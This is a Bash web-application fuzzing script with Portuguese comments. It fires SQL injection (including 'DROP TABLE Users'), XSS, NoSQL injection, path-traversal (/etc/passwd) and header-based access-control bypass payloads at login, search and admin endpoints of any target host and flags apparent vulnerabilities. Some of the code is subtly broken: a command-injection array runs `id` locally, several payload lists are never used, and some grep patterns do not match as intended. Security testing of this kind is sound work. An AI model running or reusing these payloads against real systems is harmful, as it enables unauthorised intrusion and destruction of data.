#!/bin/bash
# ==============================================================================
# Ruadan — Parameter Fuzzing (URL params + POST bodies + HTTP headers)
# ==============================================================================
# Uso: param_fuzz.sh <target> <port> <scheme>
#
# POR QUE: fuzzers de diretório testam PATHS, mas a MAIORIA das vulnerabilidades
# em aplicações modernas está nos PARÂMETROS:
#   - URL: ?id=, ?email=, ?q=, ?callback=, ?redirect=
#   - POST body: {"email":"...", "password":"...", "message":"..."}
#   - Headers: Authorization, X-Forwarded-For, Cookie, Content-Type
# Este script fuzza cada tipo com payloads de: SQLi, XSS, NoSQL injection,
# command injection, path traversal, e JSON injection.
# Emite: PARAM_VULN_FOUND: <param> <tipo> <endpoint> <evidencia>
# ==============================================================================
set -u

TARGET="${1:?uso: param_fuzz.sh <target> <port> <scheme>}"
PORT="${2:-80}"
SCHEME="${3:-http}"
CURL_OPTS="-sk --max-time 15"
TMPD="$(mktemp -d)"
trap 'rm -rf "$TMPD"' EXIT

BASE_URL="${SCHEME}://${TARGET}:${PORT}"
if [ "$SCHEME" = "http" ]; then
    _redir=$(curl $CURL_OPTS -o /dev/null -w "%{redirect_url}" "${BASE_URL}/" 2>/dev/null)
    if [ -n "$_redir" ] && [[ "$_redir" == https* ]]; then
        BASE_URL="${_redir%/}"
    fi
fi
echo "[param-fuzz] Alvo: ${BASE_URL}"

VULN_COUNT=0

# ---- Payloads por tipo ---------------------------------------------------------
SQLI_PAYLOADS=("admin' OR '1'='1' -- " "' UNION SELECT NULL--" "1; DROP TABLE Users--" "' OR 1=1#")
XSS_PAYLOADS=("<script>alert('ruadan')</script>" "\"><img src=x onerror=alert(1)>" "'-alert('ruadan')-'")
NOSQL_PAYLOADS=('{"$gt":""}' '{"$ne":"x"}' '{"$regex":"^a.*"}' '{"$where":"return true"}')
CMD_PAYLOADS=("$(id)" "`id`" "| id" "; id" "& id")
TRAV_PAYLOADS=("../../../etc/passwd" "..\\..\\..\\windows\\win.ini" "....//....//etc/passwd")
JSON_PAYLOADS=('{"email":"x","role":"admin"}' '{"admin":true}' '{"isAdmin":true}')

# ---- 1. Descobre parâmetros do index.html e JS bundles -------------------------
curl $CURL_OPTS "${BASE_URL}/" -o "${TMPD}/index.html" 2>/dev/null
PARAMS=$(grep -oE '\?([a-zA-Z_]+)=' "${TMPD}/index.html" 2>/dev/null | sed 's/[?=]//g' | sort -u | head -10)
# Adiciona parâmetros conhecidos de APIs REST
KNOWN_PARAMS="id email q search callback redirect url redirect_url code token api_key"

# ---- 2. Fuzz URL parameters nos endpoints conhecidos ---------------------------
PARAM_ENDPOINTS=(
    "/rest/products/search?q=PLACEHOLDER"
    "/rest/user/whoami"
    "/rest/products/1"
    "/api/Users?email=PLACEHOLDER"
)

echo "[param-fuzz] Fuzzando URL parameters em ${#PARAM_ENDPOINTS[@]} endpoints..."

for EP_TEMPLATE in "${PARAM_ENDPOINTS[@]}"; do
    # Substitui PLACEHOLDER por cada payload
    for PAYLOAD in "${SQLI_PAYLOADS[@]}"; do
        EP=$(echo "$EP_TEMPLATE" | sed "s/PLACEHOLDER/$(echo "$PAYLOAD" | sed 's/[/&]/\\&/g')/")
        CODE=$(curl $CURL_OPTS -o "${TMPD}/resp" -w "%{http_code}" "${BASE_URL}${EP}" 2>/dev/null)
        SIZE=$(wc -c < "${TMPD}/resp" 2>/dev/null || echo 0)
        # Detecta SQLi: 200 com dados que não deveriam vir, ou erro SQL
        if grep -qiE "sql.*error\|warning.*mysql\|uncaught\|stack trace" "${TMPD}/resp" 2>/dev/null; then
            echo "PARAM_VULN_FOUND: SQLI ${EP:0:60} — erro de SQL exposto no response (HTTP ${CODE})"
            VULN_COUNT=$((VULN_COUNT+1))
        elif [ "$CODE" = "200" ] && [ "$SIZE" -gt 500 ]; then
            # Resposta grande = UNION SELECT pode ter funcionado
            if echo "$PAYLOAD" | grep -q "UNION"; then
                echo "PARAM_VULN_FOUND: SQLI_UNION ${EP:0:60} — resposta grande (${SIZE}B) após UNION SELECT (HTTP ${CODE})"
                VULN_COUNT=$((VULN_COUNT+1))
            fi
        fi
    done

    for PAYLOAD in "${XSS_PAYLOADS[@]}"; do
        EP=$(echo "$EP_TEMPLATE" | sed "s/PLACEHOLDER/$(echo "$PAYLOAD" | sed 's/[/&]/\\&/g')/")
        CODE=$(curl $CURL_OPTS -o "${TMPD}/resp" -w "%{http_code}" "${BASE_URL}${EP}" 2>/dev/null)
        # Detecta XSS refletido
        if grep -q "ruadan" "${TMPD}/resp" 2>/dev/null; then
            echo "PARAM_VULN_FOUND: XSS_REFLECTED ${EP:0:60} — payload refletido no response (HTTP ${CODE})"
            VULN_COUNT=$((VULN_COUNT+1))
        fi
    done

    for PAYLOAD in "${TRAV_PAYLOADS[@]}"; do
        EP=$(echo "$EP_TEMPLATE" | sed "s/PLACEHOLDER/$(echo "$PAYLOAD" | sed 's/[/&]/\\&/g')/")
        CODE=$(curl $CURL_OPTS -o "${TMPD}/resp" -w "%{http_code}" "${BASE_URL}${EP}" 2>/dev/null)
        if grep -q "root:" "${TMPD}/resp" 2>/dev/null; then
            echo "PARAM_VULN_FOUND: PATH_TRAVERSAL ${EP:0:60} — /etc/passwd lido (HTTP ${CODE})"
            VULN_COUNT=$((VULN_COUNT+1))
        fi
    done
done

# ---- 3. Fuzz POST body JSON nos endpoints de login/search ------------------------
echo "[param-fuzz] Fuzzando POST body JSON..."

POST_ENDPOINTS=(
    "/rest/user/login"
    "/rest/save/review"
    "/rest/user/reset"
    "/api/Users"
)

for EP in "${POST_ENDPOINTS[@]}"; do
    # NoSQL injection
    for PAYLOAD in "${NOSQL_PAYLOADS[@]}"; do
        BODY="{\"email\":${PAYLOAD},\"password\":${PAYLOAD}}"
        RESP=$(curl $CURL_OPTS -X POST "${BASE_URL}${EP}" -H "Content-Type: application/json" -d "$BODY" 2>/dev/null)
        CODE=$(curl $CURL_OPTS -X POST "${BASE_URL}${EP}" -H "Content-Type: application/json" -d "$BODY" -o /dev/null -w "%{http_code}" 2>/dev/null)
        if [ "$CODE" = "200" ] && echo "$RESP" | grep -q "token\|success\|authenticated"; then
            echo "PARAM_VULN_FOUND: NOSQL_INJECTION ${EP} — payload ${PAYLOAD} aceito (HTTP ${CODE} + autenticação)"
            VULN_COUNT=$((VULN_COUNT+1))
        fi
    done

    # SQLi em JSON POST body
    for PAYLOAD in "${SQLI_PAYLOADS[@]}"; do
        BODY="{\"email\":\"${PAYLOAD}\",\"password\":\"x\"}"
        RESP=$(curl $CURL_OPTS -X POST "${BASE_URL}${EP}" -H "Content-Type: application/json" -d "$BODY" 2>/dev/null)
        CODE=$(curl $CURL_OPTS -X POST "${BASE_URL}${EP}" -H "Content-Type: application/json" -d "$BODY" -o /dev/null -w "%{http_code}" 2>/dev/null)
        if [ "$CODE" = "200" ] && echo "$RESP" | grep -q "token"; then
            echo "PARAM_VULN_FOUND: SQLI_POST ${EP} — payload SQLi em JSON body aceito (HTTP ${CODE} + token)"
            VULN_COUNT=$((VULN_COUNT+1))
        elif echo "$RESP" | grep -qi "sql.*error\|sqlite\|mysql"; then
            echo "PARAM_VULN_FOUND: SQLI_ERROR ${EP} — erro de SQL exposto (payload: ${PAYLOAD:0:30})"
            VULN_COUNT=$((VULN_COUNT+1))
        fi
    done
done

# ---- 4. Fuzz HTTP headers -------------------------------------------------------
echo "[param-fuzz] Fuzzando HTTP headers..."

HEADER_PAYLOADS=(
    "X-Forwarded-For: 127.0.0.1"
    "X-Original-URL: /admin"
    "X-Rewrite-URL: /admin"
    "X-Forwarded-Host: evil.com"
    "X-Custom-IP-Authorization: 127.0.0.1"
)

for HEADER in "${HEADER_PAYLOADS[@]}"; do
    HNAME=$(echo "$HEADER" | cut -d: -f1)
    HVAL=$(echo "$HEADER" | cut -d: -f2 | xargs)
    # Testa contra /admin (que normalmente bloqueia)
    RESP_ADMIN=$(curl $CURL_OPTS -H "$HEADER" "${BASE_URL}/admin" 2>/dev/null)
    RESP_NOHDR=$(curl $CURL_OPTS "${BASE_URL}/admin" 2>/dev/null)
    CODE_ADMIN=$(curl $CURL_OPTS -H "$HEADER" "${BASE_URL}/admin" -o /dev/null -w "%{http_code}" 2>/dev/null)
    CODE_NOHDR=$(curl $CURL_OPTS "${BASE_URL}/admin" -o /dev/null -w "%{http_code}" 2>/dev/null)
    # Se com header o acesso muda (200 vs 403), é um bypass de ACL
    if [ "$CODE_ADMIN" != "$CODE_NOHDR" ] && [ "$CODE_ADMIN" = "200" ]; then
        echo "PARAM_VULN_FOUND: HEADER_BYPASS ${HNAME}: ${HVAL} — /admin acessível com header (HTTP ${CODE_ADMIN} vs ${CODE_NOHDR})"
        VULN_COUNT=$((VULN_COUNT+1))
    fi
done

echo "[param-fuzz] Vulnerabilidades encontradas: ${VULN_COUNT}"
exit 0
